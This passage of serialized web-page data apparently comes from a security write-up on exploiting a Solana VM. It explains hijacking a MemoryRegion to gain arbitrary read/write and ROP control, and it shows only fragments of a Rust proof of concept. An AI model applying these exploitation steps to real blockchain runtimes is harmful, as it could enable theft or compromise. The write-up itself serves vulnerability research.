0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\". Since the VM memory layout is fixed, the pointer fields inside \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" for specific indices of input accounts are also fixed, so we can just hardcode these VM layout pointers as our signature.\"]}]\n"])</script><script>self.__next_f.push([1,"d5:[\"$\",\"h4\",\"h4-16\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 6: Arbitrary R/W via MemoryRegion Hijacking\"}]\n"])</script><script>self.__next_f.push([1,"d6:[\"$\",\"p\",\"p-125\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Once we've successfully hunted down the target \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\", we can overwrite the \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"POINTER\"}],\" account's \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion.host_addr\"}],\" and set its state to writable to achieve arbitrary memory access. For example, we can calculate the thread memory base and hijack return addresses with ROP gadgets.\"]}]\n"])</script><script>self.__next_f.push([1,"d7:[\"$\",\"pre\",\"pre-20\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" thread_mem \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x48\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"21\"]}],[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segment-27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segment-29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"21\"]}],[\"$\",\"span\",\"code-segment-31\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],\"$Le6e\",\"$Le6f\",\"\\n\",\"$Le70\",\"$Le71\",\"$Le72\",\"$Le73\",\"$Le74\",\"$Le75\",\"$Le76\",\"$Le77\",\"$Le78\",\"$Le79\",\"$Le7a\",\"$Le7b\",\"$Le7c\",\"$Le7d\",\"$Le7e\",\"$Le7f\",\"$Le80\",\"$Le81\",\"$Le82\",\"$Le83\",\"$Le84\",\"$Le85\",\"$Le86\",\"$Le87\",\"$Le88\",\"$Le89\",\"$Le8a\",\"$Le8b\",\"$Le8c\",\"$Le8d\",\"$Le8e\",\"$Le8f\",\"$Le90\",\"$Le91\",\"$Le92\",\"$Le93\",\"$Le94\",\"$Le95\",\"$Le96\",\"$Le97\",\"$Le98\",\"$Le99\",\"$Le9a\",\"$Le9b\",\"$Le9c\",\"$Le9d\",\"$Le9e\",\"$Le9f\",\"$Lea0\",\"$Lea1\",\"$Lea2\",\"$Lea3\",\"$Lea4\",\"$Lea5\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"d8:[\"$\",\"h3\",\"h3-22\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Final Exploit\"}]\nd9:[\"$\",\"p\",\"p-126\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Putting them all together, here's the final PoC:\"}]\n"])</script><script>self.__next_f.push([1,"da:[\"$\",\"pre\",\"pre-21\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"use\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"std\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"ptr\"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" mem\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"rc\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"cell\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"use\"]}],[\"$\",\"span\",\"code-segment-25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"solana_program\"]}],[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],\"$Lea6\",\"$Lea7\",\"$Lea8\",\"$Lea9\",\"$Leaa\",\"$Leab\",\"$Leac\",\"$Lead\",\"$Leae\",\"$Leaf\",\"$Leb0\",\"$Leb1\",\"$Leb2\",\"$Leb3\",\"$Leb4\",\"$Leb5\",\"$Leb6\",\"$Leb7\",\"$Leb8\",\"$Leb9\",\"$Leba\",\"$Lebb\",\"$Lebc\",\"$Lebd\",\"$Lebe\",\"$Lebf\",\"$Lec0\",\"$Lec1\",\"$Lec2\",\"$Lec3\",\"$Lec4\",\"$Lec5\",\"$Lec6\",\"$Lec7\",\"$Lec8\",\"$Lec9\",\"$Leca\",\"$Lecb\",\"$Lecc\",\"$Lecd\",\"$Lece\",\"$Lecf\",\"$Led0\",\"$Led1\",\"$Led2\",\"$Led3\",\"$Led4\",\"$Led5\",\"$Led6\",\"$Led7\",\"$Led8\",\"\\n\",\"$Led9\",\"$Leda\",\"$Ledb\",\"$Ledc\",\"$Ledd\",\"$Lede\",\"$Ledf\",\"$Lee0\",\"$Lee1\",\"\\n\",\"$Lee2\",\"$Lee3\",\"$Lee4\",\"$Lee5\",\"$Lee6\",\"$Lee7\",\"$Lee8\",\"$Lee9\",\"$Leea\",\"$Leeb\",\"$Leec\",\"$Leed\",\"$Leee\",\"\\n\",\"$Leef\",\"$Lef0\",\"$Lef1\",\"$Lef2\",\"$Lef3\",\"$Lef4\",\"$Lef5\",\"$Lef6\",\"$Lef7\",\"$Lef8\",\"$Lef9\",\"$Lefa\",\"$Lefb\",\"$Lefc\",\"$Lefd\",\"$Lefe\",\"$Leff\",\"$Lf00\",\"$Lf01\",\"$Lf02\",\"$Lf03\",\"$Lf04\",\"$Lf05\",\"$Lf06\",\"$Lf07\",\"$Lf08\",\"$Lf09\",\"$Lf0a\",\"$Lf0b\",\"$Lf0c\",\"$Lf0d\",\"$Lf0e\",\"$Lf0f\",\"$Lf10\",\"$Lf11\",\"$Lf12\",\"$Lf13\",\"$Lf14\",\"$Lf15\",\"$Lf16\",\"$Lf17\",\"$Lf18\",\"$Lf19\",\"$Lf1a\",\"$Lf1b\",\"$Lf1c\",\"$Lf1d\",\"$Lf1e\",\"$Lf1f\",\"$Lf20\",\"$Lf21\",\"$Lf22\",\"$Lf23\",\"$Lf24\",\"$Lf25\",\"$Lf26\",\"$Lf27\",\"$Lf28\",\"$Lf29\",\"$Lf2a\",\"$Lf2b\",\"$Lf2c\",\"$Lf2d\",\"$Lf2e\",\"$Lf2f\",\"$Lf30\",\"$Lf31\",\"$Lf32\",\"$Lf33\",\"$Lf34\",\"$Lf35\",\"$Lf36\",\"$Lf37\",\"$Lf38\",\"$Lf39\",\"$Lf3a\",\"$Lf3b\",\"$Lf3c\",\"$Lf3d\",\"$Lf3e\",\"$Lf3f\",\"$Lf40\",\"$Lf41\",\"$Lf42\",\"$Lf43\",\"$Lf44\",\"$Lf45\",\"$Lf46\",\"$Lf47\",\"$Lf48\",\"\\n\",\"$Lf49\",\"$Lf4a\",\"$Lf4b\",\"$Lf4c\",\"$Lf4d\",\"$Lf4e\",\"$Lf4f\",\"$Lf50\",\"$Lf51\",\"$Lf52\",\"$Lf53\",\"$Lf54\",\"$Lf55\",\"$Lf56\",\"$Lf57\",\"$Lf58\",\"$Lf59\",\"$Lf5a\",\"$Lf5b\",\"$Lf5c\",\"$Lf5d\",\"$Lf5e\",\"$Lf5f\",\"$Lf60\",\"$Lf61\",\"$Lf62\",\"$Lf63\",\"$Lf64\",\"$Lf65\",\"$Lf66\",\"$Lf67\",\"$Lf68\",\"$Lf69\",\"$Lf6a\",\"$Lf6b\",\"$Lf6c\",\"$Lf6d\",\"$Lf6e\",\"$Lf6f\",\"$Lf70\",\"$Lf71\",\"$Lf72\",\"$Lf73\",\"$Lf74\",\"$Lf75\",\"\\n\",\"$Lf76\",\"$Lf77\",\"$Lf78\",\"$Lf79\",\"$Lf7a\",\"$Lf7b\",\"$Lf7c\",\"$Lf7d\",\"$Lf7e\",\"$Lf7f\",\"$Lf80\",\"$Lf81\",\"$Lf82\",\"$Lf83\",\"$Lf84\",\"$Lf85\",\"$Lf86\",\"$Lf87\",\"$Lf88\",\"$Lf89\",\"$Lf8a\",\"\\n\",\"$Lf8b\",\"$Lf8c\",\"$Lf8d\",\"$Lf8e\",\"$Lf8f\",\"$Lf90\",\"$Lf91\",\"$Lf92\",\"$Lf93\",\"$Lf94\",\"$Lf95\",\"$Lf96\",\"$Lf97\",\"$Lf98\",\"$Lf99\",\"$Lf9a\",\"$Lf9b\",\"$Lf9c\",\"$Lf9d\",\"$Lf9e\",\"$Lf9f\",\"$Lfa0\",\"$Lfa1\",\"$Lfa2\",\"$Lfa3\",\"$Lfa4\",\"$Lfa5\",\"$Lfa6\",\"$Lfa7\",\"$Lfa8\",\"$Lfa9\",\"$Lfaa\",\"$Lfab\",\"$Lfac\",\"$Lfad\",\"$Lfae\",\"$Lfaf\",\"$Lfb0\",\"$Lfb1\",\"$Lfb2\",\"$Lfb3\",\"$Lfb4\",\"$Lfb5\",\"$Lfb6\",\"$Lfb7\",\"$Lfb8\",\"$Lfb9\",\"$Lfba\",\"$Lfbb\",\"$Lfbc\",\"$Lfbd\",\"$Lfbe\",\"$Lfbf\",\"$Lfc0\",\"$Lfc1\",\"$Lfc2\",\"$Lfc3\",\"$Lfc4\",\"$Lfc5\",\"$Lfc6\",\"$Lfc7\",\"$Lfc8\",\"$Lfc9\",\"$Lfca\",\"$Lfcb\",\"$Lfcc\",\"$Lfcd\",\"$Lfce\",\"$Lfcf\",\"$Lfd0\",\"$Lfd1\",\"$Lfd2\",\"$Lfd3\",\"$Lfd4\",\"$Lfd5\",\"$Lfd6\",\"$Lfd7\",\"$Lfd8\",\"$Lfd9\",\"$Lfda\",\"$Lfdb\",\"$Lfdc\",\"$Lfdd\",\"$Lfde\",\"$Lfdf\",\"$Lfe0\",\"$Lfe1\",\"$Lfe2\",\"$Lfe3\",\"$Lfe4\",\"$Lfe5\",\"$Lfe6\",\"$Lfe7\",\"$Lfe8\",\"$Lfe9\",\"$Lfea\",\"$Lfeb\",\"$Lfec\",\"$Lfed\",\"$Lfee\",\"$Lfef\",\"$Lff0\",\"$Lff1\",\"$Lff2\",\"$Lff3\",\"$Lff4\",\"$Lff5\",\"$Lff6\",\"$Lff7\",\"$Lff8\",\"$Lff9\",\"$Lffa\",\"$Lffb\",\"$Lffc\",\"$Lffd\",\"$Lffe\",\"$Lfff\",\"$L1000\",\"$L1001\",\"$L1002\",\"$L1003\",\"$L1004\",\"$L1005\",\"$L1006\",\"\\n\",\"$L1007\",\"$L1008\",\"$L1009\",\"$L100a\",\"$L100b\",\"$L100c\",\"$L100d\",\"$L100e\",\"$L100f\",\"$L1010\",\"$L1011\",\"$L1012\",\"$L1013\",\"$L1014\",\"$L1015\",\"$L1016\",\"$L1017\",\"$L1018\",\"$L1019\",\"$L101a\",\"$L101b\",\"$L101c\",\"$L101d\",\"$L101e\",\"$L101f\",\"$L1020\",\"$L1021\",\"$L1022\",\"$L1023\",\"$L1024\",\"$L1025\",\"$L1026\",\"$L1027\",\"$L1028\",\"$L1029\",\"$L102a\",\"$L102b\",\"$L102c\",\"$L102d\",\"$L102e\",\"$L102f\",\"$L1030\",\"$L1031\",\"$L1032\",\"$L1033\",\"$L1034\",\"$L1035\",\"$L1036\",\"$L1037\",\"$L1038\",\"$L1039\",\"$L103a\",\"$L103b\",\"$L103c\",\"$L103d\",\"$L103e\",\"$L103f\",\"$L1040\",\"$L1041\",\"$L1042\",\"$L1043\",\"$L1044\",\"$L1045\",\"$L1046\",\"$L1047\",\"$L1048\",\"$L1049\",\"$L104a\",\"$L104b\",\"$L104c\",\"$L104d\",\"$L104e\",\"$L104f\",\"$L1050\",\"$L1051\",\"$L1052\",\"$L1053\",\"$L1054\",\"$L1055\",\"$L1056\",\"$L1057\",\"$L1058\",\"$L1059\",\"$L105a\",\"$L105b\",\"$L105c\",\"$L105d\",\"\\n\",\"$L105e\",\"$L105f\",\"$L1060\",\"$L1061\",\"$L1062\",\"$L1063\",\"$L1064\",\"$L1065\",\"$L1066\",\"$L1067\",\"$L1068\",\"$L1069\",\"$L106a\",\"$L106b\",\"$L106c\",\"$L106d\",\"$L106e\",\"$L106f\",\"$L1070\",\"$L1071\",\"$L1072\",\"\\n\",\"$L1073\",\"$L1074\",\"$L1075\",\"$L1076\",\"$L1077\",\"$L1078\",\"$L1079\",\"$L107a\",\"$L107b\",\"$L107c\",\"$L107d\",\"$L107e\",\"$L107f\",\"$L1080\",\"$L1081\",\"$L1082\",\"$L1083\",\"$L1084\",\"$L1085\",\"$L1086\",\"$L1087\",\"$L1088\",\"$L1089\",\"$L108a\",\"$L108b\",\"$L108c\",\"$L108d\",\"$L108e\",\"$L108f\",\"$L1090\",\"$L1091\",\"$L1092\",\"$L1093\",\"$L1094\",\"$L1095\",\"$L1096\",\"$L1097\",\"$L1098\",\"$L1099\",\"$L109a\",\"$L109b\",\"$L109c\",\"$L109d\",\"$L109e\",\"$L109f\",\"$L10a0\",\"$L10a1\",\"$L10a2\",\"$L10a3\",\"$L10a4\",\"$L10a5\",\"$L10a6\",\"$L10a7\",\"$L10a8\",\"$L10a9\",\"$L10aa\",\"$L10ab\",\"$L10ac\",\"$L10ad\",\"$L10ae\",\"$L10af\",\"$L10b0\",\"$L10b1\",\"$L10b2\",\"$L10b3\",\"$L10b4\",\"$L10b5\",\"\\n\",\"$L10b6\",\"$L10b7\",\"$L10b8\",\"$L10b9\",\"$L10ba\",\"$L10bb\",\"$L10bc\",\"$L10bd\",\"$L10be\",\"$L10bf\",\"$L10c0\",\"$L10c1\",\"$L10c2\",\"$L10c3\",\"$L10c4\",\"$L10c5\",\"$L10c6\",\"$L10c7\",\"$L10c8\",\"$L10c9\",\"$L10ca\",\"$L10cb\",\"$L10cc\",\"$L10cd\",\"$L10ce\",\"$L10cf\",\"$L10d0\",\"$L10d1\",\"$L10d2\",\"$L10d3\",\"$L10d4\",\"$L10d5\",\"$L10d6\",\"$L10d7\",\"$L10d8\",\"$L10d9\",\"$L10da\",\"$L10db\",\"$L10dc\",\"$L10dd\",\"$L10de\",\"$L10df\",\"$L10e0\",\"$L10e1\",\"$L10e2\",\"$L10e3\",\"$L10e4\",\"$L10e5\",\"$L10e6\",\"$L10e7\",\"$L10e8\",\"$L10e9\",\"$L10ea\",\"$L10eb\",\"$L10ec\",\"$L10ed\",\"$L10ee\",\"$L10ef\",\"$L10f0\",\"$L10f1\",\"$L10f2\",\"$L10f3\",\"$L10f4\",\"$L10f5\",\"$L10f6\",\"$L10f7\",\"$L10f8\",\"$L10f9\",\"$L10fa\",\"$L10fb\",\"$L10fc\",\"$L10fd\",\"$L10fe\",\"$L10ff\",\"$L1100\",\"$L1101\",\"$L1102\",\"$L1103\",\"$L1104\",\"$L1105\",\"$L1106\",\"$L1107\",\"$L1108\",\"$L1109\",\"$L110a\",\"$L110b\",\"$L110c\",\"$L110d\",\"$L110e\",\"$L110f\",\"$L1110\",\"$L1111\",\"$L1112\",\"$L1113\",\"$L1114\",\"$L1115\",\"$L1116\",\"$L1117\",\"$L1118\",\"$L1119\",\"$L111a\",\"$L111b\",\"$L111c\",\"$L111d\",\"$L111e\",\"$L111f\",\"$L1120\",\"$L1121\",\"$L1122\",\"$L1123\",\"$L1124\",\"$L1125\",\"$L1126\",\"\\n\",\"$L1127\",\"$L1128\",\"$L1129\",\"$L112a\",\"$L112b\",\"$L112c\",\"$L112d\",\"$L112e\",\"$L112f\",\"$L1130\",\"$L1131\",\"$L1132\",\"$L1133\",\"$L1134\",\"$L1135\",\"$L1136\",\"$L1137\",\"$L1138\",\"$L1139\",\"$L113a\",\"$L113b\",\"$L113c\",\"$L113d\",\"$L113e\",\"$L113f\",\"$L1140\",\"$L1141\",\"$L1142\",\"$L1143\",\"$L1144\",\"$L1145\",\"$L1146\",\"$L1147\",\"$L1148\",\"$L1149\",\"\\n\",\"$L114a\",\"$L114b\",\"$L114c\",\"$L114d\",\"$L114e\",\"$L114f\",\"$L1150\",\"$L1151\",\"$L1152\",\"$L1153\",\"$L1154\",\"$L1155\",\"$L1156\",\"$L1157\",\"$L1158\",\"$L1159\",\"$L115a\",\"$L115b\",\"$L115c\",\"$L115d\",\"$L115e\",\"$L115f\",\"$L1160\",\"$L1161\",\"$L1162\",\"$L1163\",\"$L1164\",\"$L1165\",\"$L1166\",\"$L1167\",\"$L1168\",\"$L1169\",\"$L116a\",\"$L116b\",\"$L116c\",\"$L116d\",\"$L116e\",\"$L116f\",\"$L1170\",\"$L1171\",\"$L1172\",\"$L1173\",\"$L1174\",\"$L1175\",\"$L1176\",\"$L1177\",\"$L1178\",\"$L1179\",\"$L117a\",\"$L117b\",\"$L117c\",\"$L117d\",\"$L117e\",\"$L117f\",\"$L1180\",\"$L1181\",\"\\n\",\"$L1182\",\"$L1183\",\"$L1184\",\"$L1185\",\"$L1186\",\"$L1187\",\"$L1188\",\"$L1189\",\"$L118a\",\"\\n\",\"$L118b\",\"$L118c\",\"$L118d\",\"$L118e\",\"$L118f\",\"$L1190\",\"$L1191\",\"$L1192\",\"$L1193\",\"$L1194\",\"$L1195\",\"$L1196\",\"$L1197\",\"$L1198\",\"$L1199\",\"$L119a\",\"\\n\",\"$L119b\",\"$L119c\",\"$L119d\",\"$L119e\",\"$L119f\",\"$L11a0\",\"$L11a1\",\"$L11a2\",\"$L11a3\",\"$L11a4\",\"$L11a5\",\"$L11a6\",\"$L11a7\",\"$L11a8\",\"$L11a9\",\"$L11aa\",\"$L11ab\",\"$L11ac\",\"$L11ad\",\"$L11ae\",\"$L11af\",\"$L11b0\",\"$L11b1\",\"$L11b2\",\"$L11b3\",\"$L11b4\",\"$L11b5\",\"$L11b6\",\"$L11b7\",\"$L11b8\",\"$L11b9\",\"$L11ba\",\"$L11bb\",\"$L11bc\",\"$L11bd\",\"$L11be\",\"$L11bf\",\"$L11c0\",\"$L11c1\",\"$L11c2\",\"$L11c3\",\"$L11c4\",\"$L11c5\",\"$L11c6\",\"$L11c7\",\"\\n\",\"$L11c8\",\"$L11c9\",\"$L11ca\",\"$L11cb\",\"$L11cc\",\"$L11cd\",\"$L11ce\",\"$L11cf\",\"$L11d0\",\"\\n\